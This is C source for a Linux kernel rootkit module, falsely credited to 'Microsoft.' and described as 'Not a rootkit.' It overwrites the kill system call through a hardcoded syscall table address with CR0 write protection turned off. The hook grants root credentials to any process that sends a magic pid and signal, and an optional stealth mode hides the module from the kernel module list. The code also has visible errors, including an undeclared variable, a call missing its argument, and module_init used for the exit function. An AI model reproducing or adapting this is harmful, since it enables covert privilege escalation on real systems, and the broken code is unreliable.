#include <asm/unistd.h>
#include <asm/current.h>
#include <linux/highmem.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/moduleparam.h>

MODULE_AUTHOR("Microsoft.");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Not a rootkit.");
MODULE_VERSION("0.0.1");

#define RK_PID 7311
#define RK_SIG 7

static int lpid = 1137;
module_param(lpid, int, 0);

unsigned long *sys_call_table = (unsigned long *) 0xc12efee0; // harcoded sys_call_table address

static unsigned int cr0;

unsigned int clear_cr0()
{
	unsigned int cr0 = read_cr0();
	write_cr0(cr0 & 0xfffeffff);

	return cr0;
}

typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
kill_ptr orig_kill;

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;

	if (pid == RK_PID && sig == RK_SIG){
		struct cred * cred;
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
                cred->suid = 0;
                cred->euid = 0;
                cred->egid = 0;
                cred->fsuid = 0;
		cred->fsgid = 0;

		return 0;
	} else if (pid == lpid){
		printk(KERN_INFO "ᛗᚨ** process %d **\n" ,lpid);

		return 0;
	}

	actual_result = (*orig_kill)(pid, sig);

	return actual_result;
}

static int rk_init(void)
{
#ifdef STEALTH_MODE
	struct module *self;
#endif
	ocr0 = clear_cr0();
	orig_kill = (kill_ptr)sys_call_table[__NR_KILL];
	sys_call_table[__NR_KILL] = (unsigned long)hacked_kill;
	write_cr0;
#ifdef STEALTH_MODE
	mutex_lock(&module_mutex);
	if ((self = find_module("test")))
		list_del(&self->list);
	mutex_unlock(&module_mutex);
#endif
	printk(KERN_INFO "ᛗᚨ** rootkit loaded **\n");
	return 0;
}

static int rk_exit(void)
{
	ocr0 = clear_cr0();
	sys_call_table[__NR_KILL] = (unsigned long)orig_kill;
	write_cr0(ocr0);
	printk(KERN_INFO "ᛗᚨ** rootkit unloaded **\n");
        return 0;
}

module_init(rk_init);
module_init(rk_exit);
